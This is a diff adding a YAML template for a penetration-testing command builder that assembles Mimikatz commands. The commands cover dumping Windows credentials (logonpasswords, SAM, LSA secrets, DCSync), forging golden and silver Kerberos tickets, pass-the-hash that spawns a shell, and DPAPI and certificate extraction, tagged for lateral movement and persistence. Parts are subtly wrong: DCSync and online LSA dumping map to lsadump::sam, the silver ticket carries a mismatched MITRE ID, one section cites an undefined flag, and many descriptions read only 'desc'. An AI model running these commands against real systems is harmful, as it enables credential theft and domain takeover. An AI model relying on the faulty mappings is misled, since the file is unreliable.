@@ -1,0 +1,504 @@
+---
+projectLink: https://github.com/gentilkiwi/mimikatz
+name: Mimikatz
+languages:
+  - name: EXE
+    prefix: mimikatz
+  - name: PS
+    prefix: Invoke-Mimikatz
+
+params:
+  - name: MimikatzCommand
+    type: label
+
+  - name: MimiCommand
+    description: Mimikatz command to use
+    default: kerberos::ptt
+    template: "{0}"
+    type: select
+    options: [
+      "kerberos::ptt",
+      "kerberos::golden",
+      "kerberos::tgt",
+      "kerberos::list",
+      "kerberos::purge",
+      "privilege::debug",
+      "lsadump::sam",
+      "lsadump::secrets",
+      "lsadump::cache",
+      "lsadump::lsa",
+      "lsadump::trust",
+      "lsadump::backupkeys",
+      "lsadump::rdpdata",
+      "lsadump::dcsync",
+      "lsadump::netsync",
+      "sekurlsa::logonpasswords",
+      "sekurlsa::pth",
+      "sekurlsa::tickets",
+      "sekurlsa::ekeys",
+      "sekurlsa::dpapi",
+      "sekurlsa::minidump",
+      "sekurlsa::process",
+      "sekurlsa::searchpasswords",
+      "sekurlsa::msv",
+      "sekurlsa::wdigest",
+      "sekurlsa::kerberos",
+      "sekurlsa::tspkg",
+      "sekurlsa::livessp",
+      "sekurlsa::ssp",
+      "sekurlsa::credman",
+      "token::whoami",
+      "token::list",
+      "token::elevate",
+      "token::revert",
+      "dpapi::blob",
+      "dpapi::protect",
+      "dpapi::masterkey",
+      "dpapi::credhist",
+      "dpapi::cache",
+      "dpapi::capi",
+      "dpapi::cng",
+      "dpapi::cred",
+      "dpapi::vault",
+      "dpapi::wifi",
+      "dpapi::wwan",
+      "dpapi::chrome",
+      "crypto::providers",
+      "crypto::stores",
+      "crypto::sc",
+      "crypto::scauth",
+      "crypto::certificates",
+      "crypto::keys",
+      "crypto::capi",
+      "crypto::cng",
+      "vault::list",
+      "vault::cred",
+      "net::user",
+      "net::localgroup",
+      "net::group",
+    ]
+    optional: false
+  
+  - name: Common
+    type: label
+
+  - name: Domain
+    type: text
+    description: Domain
+    template: "/domain:{0}"
+    default: example.local
+    optional: true
+  - name: SID
+    type: text
+    description: desc
+    template: "/sid:{0}"
+    default: S-134-32512-314761
+    optional: true
+  - name: Username
+    type: text
+    description: Username
+    template: "/user:{0}"
+    default: User1
+    optional: true
+  - name: groupId
+    type: text
+    description: desc
+    template: "/id:{0}"
+    default: '512'
+    optional: true
+  - name: groups
+    type: text
+    description: desc
+    template: "/groups:{0}"
+    default: "519,520"
+    optional: true
+  - name: DomainController
+    type: text
+    description: Name of FQDN of Domain Controller
+    template: "/dc:{0}"
+    default: dc1.example.local
+    optional: true
+  - name: RunCommand
+    type: text
+    description: "the command line to run - default is: cmd to have a shell."
+    template: "/run:{0}"
+    default: cmd
+    optional: true
+  
+  - name: Keys
+    type: label
+
+  - name: krbtgt
+    type: text
+    description: KRBTGT NTLM / RC4 hash
+    template: "/krbtgt:{0}"
+    default: ""
+    optional: true
+  - name: RC4
+    type: text
+    description: the NTLM hash
+    template: "/rc4:{0}"
+    default: ""
+    optional: true
+  - name: aes128
+    type: text
+    description: the AES128 key
+    template: "/aes128:{0}"
+    default: ""
+    optional: true
+  - name: aes256
+    type: text
+    description: the AES256 key
+    template: "/aes256:{0}"
+    default: ""
+    optional: true
+  
+  
+  - name: Target & Service for a Silver Ticket
+    type: label
+
+  - name: Target
+    type: text
+    description: "the server/computer name where the service is hosted (ex: share.server.local, sql.server.local:1433, ...)"
+    template: "/target:{0}"
+    default: share.server.local
+    optional: true
+  - name: Service
+    type: text
+    description: "The service name for the ticket (ex: cifs, rpcss, http, mssql, ...)"
+    template: "/service:{0}"
+    default: cifs
+    optional: true
+  
+  - name: Target Ticket
+    type: label
+
+  - name: OutTicket
+    type: text
+    description: "filename for output the ticket - default is: ticket.kirbi"
+    template: "/ticket:{0}"
+    default: ticket.kirbi
+    optional: true
+  - name: PTT
+    type: flag
+    description: no output in file, just inject the golden ticket in current session
+    value: /ptt
+    optional: true
+  - name: TicketFile
+    type: text
+    description: Path to ticket
+    template: "{0}"
+    default: ticket.kirbi
+    optional: true
+
+  - name: Lifetime
+    type: label
+  
+  - name: StartOffset
+    type: text
+    description: desc
+    template: "/startoffset:{0}"
+    default: ""
+    optional: true
+  - name: endin
+    type: text
+    description: desc
+    template: "/endin:{0}"
+    default: ""
+    optional: true
+  - name: renewmax
+    type: text
+    description: desc
+    template: "/renewmax:{0}"
+    default: ""
+    optional: true
+
+  - name: LSA Config
+    type: label
+  
+  - name: SystemHive
+    type: text
+    description: Location of SYSTEM hive backup
+    template: "/system:{0}"
+    default: systemBkup.hiv
+    optional: true
+  - name: SamHive
+    type: text
+    description: Location of SAM hive backup
+    template: "/sam:{0}"
+    default: SamBkup.hiv
+    optional: true
+  - name: AccountName
+    type: text
+    description: Name of account to extract passwords
+    template: "/name:{0}"
+    default: krbtgt
+    optional: true
+  - name: Inject
+    type: flag
+    description: Inject option
+    value: /inject
+    optional: true
+  - name: Patch
+    type: flag
+    description: Patch option
+    value: /patch
+    optional: true
+  
+  - name: DPAPI Config
+    type: label
+  
+  - name: BlobIn
+    type: text
+    description: desc
+    template: "/in:{0}"
+    default: ""
+    optional: true
+  - name: BlobOut
+    type: text
+    description: desc
+    template: "/out:{0}"
+    default: ""
+    optional: true
+  - name: Unprotect
+    type: text
+    description: desc
+    template: "/unprotect:{0}"
+    default: ""
+    optional: true
+  - name: MasterKey
+    type: text
+    description: desc
+    template: "/masterkey:{0}"
+    default: ""
+    optional: true
+  - name: Password
+    type: text
+    description: desc
+    template: "/password:{0}"
+    default: ""
+    optional: true
+  - name: Entropy
+    type: text
+    description: desc
+    template: "/entropy:{0}"
+    default: ""
+    optional: true
+  - name: Prompt
+    type: text
+    description: desc
+    template: "/prompt:{0}"
+    default: ""
+    optional: true
+  - name: Machine
+    type: text
+    description: desc
+    template: "/machine:{0}"
+    default: ""
+    optional: true
+  - name: DpapiData
+    type: text
+    description: desc
+    template: "/data:{0}"
+    default: ""
+    optional: true
+  - name: DpapiDescription
+    type: text
+    description: desc
+    template: "/description:{0}"
+    default: ""
+    optional: true
+  
+  - name: Crypto Config
+    type: label  
+
+  - name: SystemStore
+    description: "the system store that must be used to list stores (default: CERT_SYSTEM_STORE_CURRENT_USER)"
+    default: LOCAL_MACHINE
+    template: "/systemstore:{0}"
+    type: select
+    options: [
+      CURRENT_USER,
+      USER_GROUP_POLICY,
+      LOCAL_MACHINE,
+      LOCAL_MACHINE_GROUP_POLICY,
+      LOCAL_MACHINE_ENTERPRISE,
+      CURRENT_SERVICE,
+      USERS,
+      SERVICES
+    ]
+    optional: true
+  - name: CAName
+    type: text
+    description: the subject name of the certificate authority (needed to sign the certificate)
+    template: "/caname:{0}"
+    default: KiwiCA
+    optional: true
+  - name: CAStore
+    type: flag
+    description: "optional - the system store that contains the certificate authority (default: CERT_SYSTEM_STORE_LOCAL_MACHINE)"
+    template: "/castore:{SystemStore}"
+    optional: true
+  - name: UPN
+    type: text
+    description: "the User Principal Name (UPN) targetted (eg: user@lab.local)"
+    template: "/upn:{0}"
+    default: user@example.local
+    optional: true
+  - name: PFX
+    type: text
+    description: "optional - the filename for saving the final certificate (default: no file, stored in CERT_SYSTEM_STORE_CURRENT_USER)"
+    template: "/pfx:{0}"
+    default: user.pfx
+    optional: true
+    
+  
+  - name: Flags
+    type: label
+  
+  - name: Export
+    type: flag
+    description: optional - export all tickets to files
+    value: /export
+    optional: true
+    selected: false
+
+sections:
+  - name: Self crafted command
+    labels: []
+    mitre: ''
+    verb: ''
+    required_flags: [MimiCommand]
+    optional_flags: [
+      MimiCommand,
+      Domain,
+      SID,
+      Username,
+      groupId,
+      groups,
+      DomainController,
+      RunCommand,
+      krbtgt,
+      RC4,
+      aes128,
+      aes256,
+      Target,
+      Service,
+      OutTicket,
+      PTT,
+      TicketFile,
+      StartOffset,
+      endin,
+      renewmax,
+      SystemHive,
+      SamHive,
+      AccountName,
+      Inject,
+      Patch,
+      BlobIn,
+      BlobOut,
+      Unprotect,
+      MasterKey,
+      Password,
+      Entropy,
+      Prompt,
+      Machine,
+      DpapiData,
+      DpapiDescription,
+      SystemStore,
+      CAName,
+      CAStore,
+      UPN,
+      PFX,
+      Export
+    ]
+  - name: Kerberos PTT
+    labels: ["Lateral"]
+    mitre: ''
+    verb: 'kerberos::ptt'
+    required_flags: [TicketFile]
+    optional_flags: []
+  - name: Kerberos Golden tickets
+    labels: ["Lateral", "Persistancy"]
+    mitre: 'T1558.001'
+    verb: 'kerberos::golden'
+    required_flags: [Domain, Username, SID]
+    optional_flags: [OutTicket, PTT, StartOffset, endin, renewmax]
+  - name: Kerberos Silver tickets
+    labels: ["Lateral"]
+    mitre: 'T1548.002'
+    verb: 'kerberos::golden'
+    required_flags: [Domain, Username, SID]
+    optional_flags: [OutTicket, PTT, StartOffset, endin, renewmax]
+  - name: Pass-The-Hash
+    labels: ["Lateral", "Hash"]
+    mitre: 'T1550.002'
+    verb: ''
+    required_flags: [Username, Domain]
+    optional_flags: [RC4, aes128, aes256, RunCommand]
+  - name: Kerberos TGT
+    labels: []
+    mitre: ''
+    verb: 'kerberos::tgt'
+    required_flags: []
+    optional_flags: [Export]
+  - name: Kerberos Purge
+    labels: []
+    mitre: ''
+    verb: 'kerberos::purge'
+    required_flags: []
+    optional_flags: []
+  - name: Extract SAM passwords offline
+    labels: []
+    mitre: ''
+    verb: 'lsadump::sam'
+    required_flags: [SystemHive, SamHive]
+    optional_flags: []
+  - name: Extract LSA passwords online
+    labels: []
+    mitre: ''
+    verb: 'lsadump::sam'
+    required_flags: []
+    optional_flags: [groupId, Inject, AccountName, Patch]
+  - name: DCSync
+    labels: ["Lateral"]
+    mitre: 'T1003.006'
+    verb: 'lsadump::sam'
+    required_flags: [Domain, DomainController]
+    optional_flags: []
+  - name: DPAPI Blob
+    labels: []
+    mitre: ''
+    verb: 'dpapi::blob'
+    required_flags: [BlobIn, BlobOut]
+    optional_flags: [Unprotect, MasterKey, Password, Entropy, Prompt, Machine]
+  - name: DPAPI Protect
+    labels: []
+    mitre: ''
+    verb: 'dpapi::protect'
+    required_flags: [DpapiData]
+    optional_flags: [Entropy, Prompt, Machine, BlobOut]
+  - name: DPAPI MasterKey
+    labels: []
+    mitre: ''
+    verb: 'dpapi::masterkey'
+    required_flags: [BlobIn]
+    optional_flags: [DpapiDescription, Entropy, Prompt, Machine, BlobOut]
+  - name: DPAPI CredHist
+    labels: []
+    mitre: ''
+    verb: 'dpapi::credhist'
+    required_flags: [BlobIn]
+    optional_flags: [SID, Password, Hash]
+  - name: Crypto stores
+    labels: []
+    mitre: ''
+    verb: 'crypto::stores'
+    required_flags: [SystemStore]
+    optional_flags: []
+  - name: Crypto scauth
+    labels: []
+    mitre: ''
+    verb: 'crypto::scauth'
+    required_flags: [CAName, UPN]
+    optional_flags: [CAStore, PFX]
